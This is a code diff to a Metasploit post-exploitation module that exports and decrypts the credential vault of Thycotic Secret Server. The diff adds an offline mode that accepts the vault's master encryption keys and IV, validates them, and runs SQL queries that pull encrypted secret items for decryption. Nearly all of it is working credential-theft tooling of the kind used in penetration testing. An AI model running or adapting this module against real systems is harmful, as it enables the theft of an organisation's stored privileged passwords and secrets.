@@ -66,12 +66,44 @@ class MetasploitModule < Msf::Post
       )
     )
     register_options([
-      OptPath.new('CSVFILE', [ false, 'Path to database dump CSV file' ])
+      OptPath.new('CSVFILE', [ false, 'Path to database dump CSV file' ]),
+      OptInt.new('SESSION', [ false, 'The session to run this module on' ])
     ])
+    register_advanced_options([
+      OptFloat.new('BUILD', [ false, 'Secret Server version / build number (ex: 10.2)' ]),
+      OptString.new('KEY', [ false, 'SecretServer 128-bit AES MEK value (hex)' ]),
+      OptString.new('KEY256', [ false, 'SecretServer 256-bit AES MEK value (hex)' ]),
+      OptString.new('IV', [ false, 'SecretServer MEK IV (hex)' ]),
+      OptString.new('IP', [ false, 'Optional IPv4 address to attach to loot if sessionless', '127.0.0.1' ])
+    ])
+  end
+
+  def current_session
+    datastore['SESSION']
   end
 
   def csv_loot
     datastore['CSVFILE']
+  end
+
+  def ss_key
+    @ss_key ||= datastore['KEY']
+  end
+
+  def ss_key256
+    @ss_key256 ||= datastore['KEY256']
+  end
+
+  def ss_iv
+    @ss_iv ||= datastore['IV']
+  end
+
+  def ss_build
+    @ss_build ||= datastore['BUILD']
+  end
+
+  def loot_host
+    datastore['IP']
   end
 
   def export_header_row_legacy
@@ -87,19 +119,51 @@ class MetasploitModule < Msf::Post
   end
 
   def run
-    if action.name.downcase == 'decrypt' && !csv_loot
+    current_action = action.name.downcase
+    if current_action == 'decrypt' && !csv_loot
       print_error('No database export file specified')
       raise Msf::OptionValidateError, ['CSVFILE']
     end
-    init_module
-    case action.name.downcase
+    if current_session < 0
+      raise Msf::OptionValidateError, ['KEY'] if ss_key.nil?
+
+      unless ss_key.length == 32 && ss_key.match?(/^[0-9a-f]+$/i)
+        print_error('Key value must be 16 byte / 32 char hexadecimal')
+        raise Msf::OptionValidateError, ['KEY']
+      end
+      raise Msf::OptionValidateError, ['KEY256'] if ss_key256.nil?
+
+      unless ss_key256.length == 64 && ss_key256.match?(/^[0-9a-f]+$/i)
+        print_error('Key256 value must be 32 byte / 64 char hexadecimal')
+        raise Msf::OptionValidateError, ['KEY256']
+      end
+      raise Msf::OptionValidateError, ['IV'] if ss_iv.nil?
+
+      unless ss_iv.length == 32 && ss_iv.match?(/^[0-9a-f]+$/i)
+        print_error('IV value must be 16 byte / 32 char hexadecimal')
+        raise Msf::OptionValidateError, ['IV']
+      end
+      @ss_key = [ss_key].pack('H*')
+      @ss_key256 = [ss_key256].pack('H*')
+      @ss_iv = [ss_iv].pack('H*')
+      if ss_build.nil? || ss_build <= 0
+        print_error('Please specify the target build of Secret Server for offline decryption')
+        raise Msf::OptionValidateError, ['BUILD']
+      end
+      @ss_build = ss_build.to_f
+    else
+      init_module
+    end
+    case current_action
     when 'dump'
+      fail_with(Msf::Exploit::Failure::NoTarget, 'Dump is not a supported action without a valid session') unless current_session > 0
       print_status('Performing export and decryption of Secret Server SQL database')
       encrypted_csv_file = export
       print_good("Encrypted Secret Server Database Dump: #{encrypted_csv_file}")
       decrypted_csv_file = decrypt(encrypted_csv_file)
       print_good("Decrypted Secret Server Database Dump: #{decrypted_csv_file}")
     when 'export'
+      fail_with(Msf::Exploit::Failure::NoTarget, 'Export is not a supported action without a valid session') unless current_session > 0
       print_status('Performing export of Secret Server SQL database to CSV file')
       encrypted_csv_file = export
       print_good("Encrypted Secret Server Database Dump: #{encrypted_csv_file}")
@@ -150,10 +214,18 @@ class MetasploitModule < Msf::Post
 
   def dump_thycotic_db
     if @ss_build <= 8.7 # REALLY old-style: ItemKey and MekIV do not exist
-      sql_query = 'SET NOCOUNT ON;SELECT s.SecretID,s.Active,CONVERT(VARBINARY(256),t.SecretTypeName) SecretType,CONVERT(VARBINARY(256),s.SecretName) SecretName,i.IsEncrypted,i.IsSalted,i.Use256Key,CONVERT(VARBINARY(256),f.SecretFieldName) SecretFieldName,i.ItemValue,i.ItemValue2,i.IV FROM tbSecretItem AS i JOIN tbSecret AS s ON (s.SecretID=i.SecretID) JOIN tbSecretField AS f ON (i.SecretFieldID=f.SecretFieldID) JOIN tbSecretType AS t ON (s.SecretTypeId=t.SecretTypeID)'
+      sql_query = 'SET NOCOUNT ON;SELECT s.SecretID,s.Active,CONVERT(VARBINARY(256),t.SecretTypeName) SecretType,
+        CONVERT(VARBINARY(256),s.SecretName) SecretName,i.IsEncrypted,i.IsSalted,i.Use256Key,
+        CONVERT(VARBINARY(256),f.SecretFieldName) SecretFieldName,i.ItemValue,i.ItemValue2,i.IV
+        FROM tbSecretItem AS i JOIN tbSecret AS s ON (s.SecretID=i.SecretID)
+        JOIN tbSecretField AS f ON (i.SecretFieldID=f.SecretFieldID) JOIN tbSecretType AS t ON (s.SecretTypeId=t.SecretTypeID)'
       export_header_row = export_header_row_legacy
-    else
-      sql_query = 'SET NOCOUNT ON;SELECT s.SecretID,s.Active,CONVERT(VARBINARY(256),t.SecretTypeName) SecretType,CONVERT(VARBINARY(256),s.SecretName) SecretName,i.IsEncrypted,i.IsSalted,i.Use256Key,CONVERT(VARBINARY(256),f.SecretFieldName) SecretFieldName,s.[Key],s.IvMEK,i.ItemValue,i.ItemValue2,i.IV FROM tbSecretItem AS i JOIN tbSecret AS s ON (s.SecretID=i.SecretID) JOIN tbSecretField AS f ON (i.SecretFieldID=f.SecretFieldID) JOIN tbSecretType AS t ON (s.SecretTypeId=t.SecretTypeID)'
+    else # All other versions seem to support this schema
+      sql_query = 'SET NOCOUNT ON;SELECT s.SecretID,s.Active,CONVERT(VARBINARY(256),t.SecretTypeName) SecretType,
+        CONVERT(VARBINARY(256),s.SecretName) SecretName,i.IsEncrypted,i.IsSalted,i.Use256Key,
+        CONVERT(VARBINARY(256),f.SecretFieldName) SecretFieldName,s.[Key],s.IvMEK,i.ItemValue,i.ItemValue2,i.IV
+        FROM tbSecretItem AS i JOIN tbSecret AS s ON (s.SecretID=i.SecretID)
+        JOIN tbSecretField AS f ON (i.SecretFieldID=f.SecretFieldID) JOIN tbSecretType AS t ON (s.SecretTypeId=t.SecretTypeID)'
       export_header_row = export_header_row_modern
     end
     if @ss_db_integrated_auth
@@ -166,7 +238,7 @@ class MetasploitModule < Msf::Post
     csv = CSV.parse(query_result.gsub("\r", ''), row_sep: :auto, headers: export_header_row, quote_char: "\x00", skip_blanks: true)
     fail_with(Msf::Exploit::Failure::UnexpectedReply, 'Error parsing SQL dataset into CSV format') unless csv
     @ss_total_secrets = csv['SecretID'].uniq.count
-    fail_with(Msf::Exploit::Failure::NoTarget, 'SQL query dataset contains no SecretID column values') unless @ss_total_secrets >= 1 && !csv['SecretID'].uniq.first.nil?
+    fail_with(Msf::Exploit::Failure::NoTarget, 'SQL dataset contains no SecretID column values') unless @ss_total_secrets >= 1 && !csv['SecretID'].uniq.first.nil?
     csv
   end
 
@@ -536,9 +608,9 @@ class MetasploitModule < Msf::Post
     secret_use256 = options.fetch(:secret_use256)
     secret_salted = options.fetch(:secret_salted)
     if secret_use256 == 1
-      mek = @ss_key256
+      mek = ss_key256
     else
-      mek = @ss_key
+      mek = ss_key
     end
     if @ss_build > 8.7 && secret_salted == 1
       intermediate_key = aes_cbc_decrypt(secret_key, mek, secret_miv)
